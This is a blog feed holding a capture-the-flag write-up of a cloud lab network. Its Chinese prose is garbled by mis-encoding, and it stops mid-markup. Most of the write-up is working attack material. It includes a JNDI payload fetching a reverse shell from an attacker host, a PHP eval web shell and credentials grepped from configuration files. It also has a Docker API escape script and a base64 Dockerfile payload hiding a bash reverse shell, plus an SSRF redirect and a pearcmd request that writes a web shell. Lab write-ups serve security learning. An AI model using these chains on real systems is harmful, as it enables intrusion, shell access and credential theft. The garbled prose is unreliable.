<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>åˆé›¶Â·b10g~ğŸ¥</title>
  
  
  <link href="https://bowuchuling.github.io/atom.xml" rel="self"/>
  
  <link href="https://bowuchuling.github.io/"/>
  <updated>2024-12-25T04:20:28.834Z</updated>
  <id>https://bowuchuling.github.io/</id>
  
  <author>
    <name>Chu0ğŸ¥</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ CloudNet</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_CloudNet.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_CloudNet.html</id>
    <published>2024-12-24T13:51:42.736Z</published>
    <updated>2024-12-25T04:20:28.834Z</updated>
    
    <content type="html"><![CDATA[<h1>CloudNet</h1><p>é¦–å‘å…ˆçŸ¥ï¼ŒæŠ€æœ¯é—®é¢˜æ¬¢è¿äº¤æµQQï¼š2161992897</p><p>éƒ¨åˆ†å‚è€ƒå¤§å¤´å¸ˆå‚…çš„wpï¼Œå¸ˆå‚…å®åœ¨å¤ªå¼ºäº†</p><h2 id="flag1">flag1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">39.99.148.11:25 open</span><br><span class="line">39.99.148.11:110 open</span><br><span class="line">39.99.148.11:22 open</span><br><span class="line">39.99.148.11:80 open</span><br><span class="line">39.99.148.11:8080 open</span><br><span class="line">[*] alive ports len is: 5</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.148.11       code:200 len:12592  title:å¹¿åŸå¸‚äººæ°‘åŒ»é™¢</span><br><span class="line">[*] WebTitle http://39.99.148.11:8080  code:200 len:282    title:None</span><br></pre></td></tr></table></figure><p><a href="https://wiki.timlzh.com/PeiQi-Wiki/wiki/oa/O2OA/O2OA%20invoke%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2020-18740/">https://wiki.timlzh.com/PeiQi-Wiki/wiki/oa/O2OA/O2OA invoke åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CNVD-2020-18740/</a></p><p>é»˜è®¤å¯†ç </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xadmin/<span class="symbol">o2oa@</span><span class="number">2022</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241224214922972.png" alt="image-20241224214922972"></p><p>æ·»åŠ æ¥å£:</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241224214929380.png" alt="image-20241224214929380"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a = main<span class="constructor">Output()</span>; </span><br><span class="line"><span class="keyword">function</span> main<span class="constructor">Output()</span> &#123;</span><br><span class="line">    var aaa = <span class="module-access"><span class="module"><span class="identifier">Java</span>.</span></span><span class="keyword">type</span>(<span class="string">&quot;javax.naming.InitialContext&quot;</span>);</span><br><span class="line">aaa.<span class="keyword">do</span><span class="constructor">Lookup(<span class="string">&quot;ldap://vpsip:1389/Deserialization/CommonsBeanutils1/ReverseShell/vpsip/250&quot;</span>)</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">2</span>.<span class="number">0</span>-SNAPSHOT.jar -l <span class="number">1389</span> -p <span class="number">8000</span> -i vpsip</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241224214939208.png" alt="image-20241224214939208"></p><p>ç‚¹å‡»æ‰§è¡Œå³å¯æ‹¿åˆ°shellï¼Œåé¢å°±æ˜¯ç¿»é…ç½®æ–‡ä»¶æ‹¿åˆ°ak-sk</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@228d6bc6421b</span><span class="symbol">:/opt/o2server</span><span class="comment"># grep -r &quot;password&quot; config</span></span><br><span class="line">config/<span class="symbol">externalStorageSources.json:</span>                     <span class="string">&quot;password&quot;</span>: <span class="string">&quot;TGdtqwJbBrEMhCCMDVtlHKU=&quot;</span>,</span><br><span class="line">config/<span class="symbol">token.json:</span>  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;(ENCRYPT:tOK_FdwfDdZ1_86kEO8X_A)&quot;</span>,</span><br><span class="line">config/<span class="symbol">externalDataSources.json:</span>                <span class="string">&quot;password&quot;</span> <span class="symbol">:<span class="string">&quot;o2oa@2022&quot;</span></span>,</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;minio&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;min&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bxBZOXDlizzuujdR&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TGdtqwJbBrEMhCCMDVtlHKU=&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;172.22.18.29&quot;</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">9000</span><span class="punctuation">,</span></span><br><span class="line">                  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;o2oa&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22.18.29:9000</span> open</span><br><span class="line"><span class="number">172.22.18.29:22</span> open</span><br><span class="line">^C<span class="string">[*]</span> alive ports len is: <span class="number">2</span></span><br><span class="line">start vulscan</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">18</span>.<span class="number">29</span>:<span class="number">9000</span>  code:<span class="number">307</span> len:<span class="number">43</span>     title:None è·³è½¬url: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">18</span>.<span class="number">29</span>:<span class="number">9000</span>/minio/</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">18</span>.<span class="number">29</span>:<span class="number">9000</span>/minio/ code:<span class="number">200</span> len:<span class="number">2281</span>   title:MinIO Browser</span><br></pre></td></tr></table></figure><p>minioè¿æ¥ï¼Œä¸Šä¼ shellï¼Œç­‰ä¸€ä¼šå„¿å…¶åŒæ­¥åå³å¯æ‹¿ä¸‹å¤–ç½‘</p><h2 id="flag2">flag2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//39.98.108.142/shell.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;chu0&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flagåœ¨æ ¹ç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">172.22.18.64:22 open</span><br><span class="line">172.22.18.61:22 open</span><br><span class="line">172.22.18.23:22 open</span><br><span class="line">172.22.18.29:22 open</span><br><span class="line">172.22.18.61:111 open</span><br><span class="line">172.22.18.64:80 open</span><br><span class="line">172.22.18.61:80 open</span><br><span class="line">172.22.18.23:80 open</span><br><span class="line">172.22.18.61:179 open</span><br><span class="line">172.22.18.23:8080 open</span><br><span class="line">172.22.18.29:9000 open</span><br><span class="line">172.22.18.61:9253 open</span><br><span class="line">172.22.18.61:9353 open</span><br><span class="line">172.22.18.23:10000 open</span><br><span class="line">172.22.18.61:10256 open</span><br><span class="line">172.22.18.61:10250 open</span><br><span class="line">172.22.18.61:10249 open</span><br><span class="line">172.22.18.61:10248 open</span><br><span class="line">172.22.18.61:30020 open</span><br><span class="line">172.22.18.61:32686 open</span><br><span class="line">[*] alive ports len is: 20</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://172.22.18.23       code:200 len:12592  title:å¹¿åŸå¸‚äººæ°‘åŒ»é™¢</span><br><span class="line">[*] WebTitle http://172.22.18.61:10248 code:404 len:19     title:None</span><br><span class="line">[*] WebTitle http://172.22.18.29:9000  code:307 len:43     title:None è·³è½¬url: http://172.22.18.29:9000/minio/</span><br><span class="line">[*] WebTitle http://172.22.18.23:10000 code:400 len:0      title:None</span><br><span class="line">[*] WebTitle https://172.22.18.61:32686 code:200 len:1422   title:Kubernetes Dashboard</span><br><span class="line">[*] WebTitle http://172.22.18.64       code:200 len:785    title:Harbor</span><br><span class="line">[*] WebTitle http://172.22.18.61:10256 code:404 len:19     title:None</span><br><span class="line">[*] WebTitle http://172.22.18.61:10249 code:404 len:19     title:None</span><br><span class="line">[*] WebTitle http://172.22.18.61:9353  code:404 len:19     title:None</span><br><span class="line">[*] WebTitle http://172.22.18.61:9253  code:404 len:19     title:None</span><br><span class="line">[*] WebTitle http://172.22.18.23:8080  code:200 len:282    title:None</span><br><span class="line">[*] WebTitle http://172.22.18.61       code:200 len:8710   title:åŒ»é™¢å†…éƒ¨å¹³å°</span><br><span class="line">[+] InfoScan https://172.22.18.61:32686 [Kubernetes] </span><br><span class="line">[*] WebTitle http://172.22.18.61:30020 code:200 len:8710   title:åŒ»é™¢å†…éƒ¨å¹³å°</span><br><span class="line">[+] InfoScan http://172.22.18.64       [Harbor] </span><br><span class="line">[*] WebTitle https://172.22.18.61:10250 code:404 len:19     title:None</span><br><span class="line">[*] WebTitle http://172.22.18.29:9000/minio/ code:200 len:2281   title:MinIO Browser</span><br></pre></td></tr></table></figure><h2 id="flag3">flag3</h2><p>ä¸‹é¢è¿™éƒ¨åˆ†æ˜¯harderå¸ˆå‚…åšçš„ï¼Œtql</p><p><a href="https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api">https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api</a></p><p>æœ€å¼€å§‹æ‹‰å–è¿œç«¯dockerä¸‹æ¥æµ‹è¯•ä¸€ä¸‹</p><p>æ‹‰å–dockerè¦æ³¨æ„çš„æ˜¯ï¼Œéœ€è¦æ”¹httpæ–¹å¼ã€‚æˆ‘è¿™é‡Œæ˜¯é€šè¿‡è®¾ç½®çš„/etc/docker/daemon.jsonæŠŠhttpså…¨éƒ¨å‰æ‰ï¼Œç„¶åè‡ªå·±æ·»åŠ äº†ä¸€ä¸ªhttpï¼Œæœ€å…³é”®çš„è¿˜æ˜¯è¦è®¾ç½®è¿™ä¸ªsocksä»£ç†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>systemd<span class="regexp">/system/</span>docker.service.d/http-proxy.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">&quot;HTTP_PROXY=socks5://39.99.228.29:10000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®åé‡å¯æœåŠ¡</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -itd --name mysql_container <span class="number">172.22.18.64</span>/public/mysql:<span class="number">5</span>.<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">docker</span> exec -it mysql_container bash</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241224214950337.png" alt="image-20241224214950337"></p><p>æµ‹è¯•å‘ç°æ²¡æœ‰wgetå’Œcurlï¼Œè¿™é‡Œå°±ç”¨ä¸äº†https://zone.huoxian.cn/d/2801-minio-ssrf-docker-apiè¿™ä¸ªé‡Œé¢æä¾›çš„è„šæœ¬æ¥å‘åŒ…ï¼Œæˆ‘ä»¬å°±ç”¨å¤§å¤´å¸ˆå‚…çš„ç”¨execé‡å†™çš„è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/172.17.0.1/2375</span><br><span class="line">lines=(</span><br><span class="line">    <span class="string">&#x27;POST /containers/create HTTP/1.1&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Host: 172.17.0.1:2375&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Connection: close&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Content-Type: application/json&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Content-Length: 133&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#123;&quot;HostName&quot;:&quot;remoteCreate&quot;,&quot;User&quot;:&quot;root&quot;,&quot;Image&quot;:&quot;172.22.18.64/public/mysql:5.6&quot;,&quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/mnt&quot;],&quot;Privileged&quot;:true&#125;&#125;&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;%s\r\n&#x27;</span> <span class="string">&quot;<span class="variable">$&#123;lines[@]&#125;</span>&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> -r data &lt;&amp;3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$data</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$data</span> == <span class="string">&#x27;&#123;&quot;Id&quot;:&quot;&#x27;</span>* ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$data</span> | <span class="built_in">cut</span> -c 8-12 &gt; /tmp/id</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">exec</span> 3&gt;&amp;-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/172.17.0.1/2375â€‹</span><br><span class="line">lines=(</span><br><span class="line">    <span class="string">&quot;POST /containers/`cat /tmp/id`/start HTTP/1.1&quot;</span>â€‹</span><br><span class="line">    <span class="string">&#x27;Host: 172.17.0.1:2375&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Connection: close&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Content-Length: 0&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;%s\r\n&#x27;</span> <span class="string">&quot;<span class="variable">$&#123;lines[@]&#125;</span>&quot;</span> &gt;&amp;3</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> -r data &lt;&amp;3; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$data</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">exec</span> 3&gt;&amp;-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/172.17.0.1/2375</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">exec</span> 3&gt;&amp;-</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠå†…å®¹å†™åˆ°Dockerfileé‡Œé¢ï¼Œè¿™æ ·:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> <span class="number">172.22</span>.<span class="number">18.64</span>/public/mysql:<span class="number">5.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> IyEvdXNyL2Jpbi9lbnYgYmFzaAoKIyAxCmV4ZWMgMzw+L2Rldi90Y3AvMTcyLjE3LjAuMS8yMzc1CmxpbmVzPSgKICAgICdQT1NUIC9jb250YWluZXJzL2NyZWF0ZSBIVFRQLzEuMScKICAgICdIb3N0OiAxNzIuMTcuMC4xOjIzNzUnCiAgICAnQ29ubmVjdGlvbjogY2xvc2UnCiAgICAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJwogICAgJ0NvbnRlbnQtTGVuZ3RoOiAxMzMnCiAgICAnJwogICAgJ3siSG9zdE5hbWUiOiJyZW1vdGVDcmVhdGUiLCJVc2VyIjoicm9vdCIsIkltYWdlIjoiMTcyLjIyLjE4LjY0L3B1YmxpYy9teXNxbDo1LjYiLCJIb3N0Q29uZmlnIjp7IkJpbmRzIjpbIi86L21udCJdLCJQcml2aWxlZ2VkIjp0cnVlfX0nCikKcHJpbnRmICclc1xyXG4nICIke2xpbmVzW0BdfSIgPiYzCndoaWxlIHJlYWQgLXIgZGF0YSA8JjM7IGRvCiAgICBlY2hvICRkYXRhCiAgICBpZiBbWyAkZGF0YSA9PSAneyJJZCI6IicqIF1dOyB0aGVuCiAgICAgICAgZWNobyAkZGF0YSB8IGN1dCAtYyA4LTEyID4gL3RtcC9pZAogICAgZmkKZG9uZQpleGVjIDM+Ji0KCiMgMgpleGVjIDM8Pi9kZXYvdGNwLzE3Mi4xNy4wLjEvMjM3NQpsaW5lcz0oCiAgICAiUE9TVCAvY29udGFpbmVycy9gY2F0IC90bXAvaWRgL3N0YXJ0IEhUVFAvMS4xIgogICAgJ0hvc3Q6IDE3Mi4xNy4wLjE6MjM3NScKICAgICdDb25uZWN0aW9uOiBjbG9zZScKICAgICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcKICAgICdDb250ZW50LUxlbmd0aDogMCcKICAgICcnCikKcHJpbnRmICclc1xyXG4nICIke2xpbmVzW0BdfSIgPiYzCndoaWxlIHJlYWQgLXIgZGF0YSA8JjM7IGRvCiAgICBlY2hvICRkYXRhCmRvbmUKZXhlYyAzPiYtCgojIDMKZXhlYyAzPD4vZGV2L3RjcC8xNzIuMTcuMC4xLzIzNzUKbGluZXM9KAogICAgIlBPU1QgL2NvbnRhaW5lcnMvYGNhdCAvdG1wL2lkYC9leGVjIEhUVFAvMS4xIgogICAgJ0hvc3Q6IDE3Mi4xNy4wLjE6MjM3NScKICAgICdDb25uZWN0aW9uOiBjbG9zZScKICAgICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nCiAgICAnQ29udGVudC1MZW5ndGg6IDc1JwogICAgJycKICAgICd7IkNtZCI6IFsiL2Jpbi9iYXNoIiwgIi1jIiwgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTcyLjIyLjE4LjIzLzE5OTk5IDA+JjEiXX0nCikKcHJpbnRmICclc1xyXG4nICIke2xpbmVzW0BdfSIgPiYzCndoaWxlIHJlYWQgLXIgZGF0YSA8JjM7IGRvCiAgICBlY2hvICRkYXRhCiAgICBpZiBbWyAkZGF0YSA9PSAneyJJZCI6IicqIF1dOyB0aGVuCiAgICAgICAgZWNobyAkZGF0YSB8IGN1dCAtYyA4LTcxID4gL3RtcC9pZAogICAgZmkKZG9uZQpleGVjIDM+Ji0KCiMgNApleGVjIDM8Pi9kZXYvdGNwLzE3Mi4xNy4wLjEvMjM3NQpsaW5lcz0oCiAgICAiUE9TVCAvZXhlYy9gY2F0IC90bXAvaWRgL3N0YXJ0IEhUVFAvMS4xIgogICAgJ0hvc3Q6IDE3Mi4xNy4wLjE6MjM3NScKICAgICdDb25uZWN0aW9uOiBjbG9zZScKICAgICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nCiAgICAnQ29udGVudC1MZW5ndGg6IDI3JwogICAgJycKICAgICd7IkRldGFjaCI6dHJ1ZSwiVHR5IjpmYWxzZX0nCikKcHJpbnRmICclc1xyXG4nICIke2xpbmVzW0BdfSIgPiYzCndoaWxlIHJlYWQgLXIgZGF0YSA8JjM7IGRvCiAgICBlY2hvICRkYXRhCmRvbmUKZXhlYyAzPiYtCgoK | <span class="built_in">base64</span> -d &gt; /tmp/1.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /tmp/1.sh &amp;&amp; /tmp/1.sh</span></span><br></pre></td></tr></table></figure><p>æŠŠDockerfileæ”¾åˆ°æˆ‘ä»¬172.22.18.23è¿™å°æœºå™¨çš„/var/www/html/Dockerfileä¸‹ã€‚</p><p>å› ä¸ºé¶æœºçš„ç¼˜æ•…ï¼Œä»–æœ‰æ—¶å€™ä¼šåˆ·æ–°index.htmlï¼Œå¦‚æœå­˜åœ¨index.htmlæˆ‘ä»¬å°±é‡å®šå‘ä¸æˆåŠŸ,æ‰€ä»¥æˆ‘ä»¬åœ¨/tmpä¸‹å¼€å¯ä¸€ä¸ªphpæœåŠ¡æ”¾ä¸Šæˆ‘ä»¬çš„/tmp/index.php</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php</span> -S <span class="number">0.0.0.0:8081</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://127.0.0.1:2375/build?remote=http://172.22.18.23/Dockerfile&amp;nocache=true&amp;t=evil:1&#x27;</span>, <span class="literal">false</span>, <span class="number">307</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥httpå‘åŒ…äº†ï¼Œä¸»è¦çš„æ˜¯çœŸå®HOSTæ˜¯ç»™172.22.18.29è¿™ä¸ªå‘åŒ…æ‰€ä»¥éœ€è¦è®¾ç½®çœŸå®çš„HOST</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/minio/webrpc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.22.18.23:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>76</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;jsonrpc&quot;</span><span class="punctuation">:</span><span class="string">&quot;2.0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;params&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;Test&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;web.LoginSTS&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241224215001806.png" alt="image-20241224215001806"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241224215010470.png" alt="image-20241224215010470"></p><h2 id="flag4">flag4</h2><p>æè‡´cmsï¼Œthinkphpçš„rceæ¼æ´</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;l=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/shell1.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.22.18.61</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=4c0847ef686e7c800b472dd0972896eb</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td 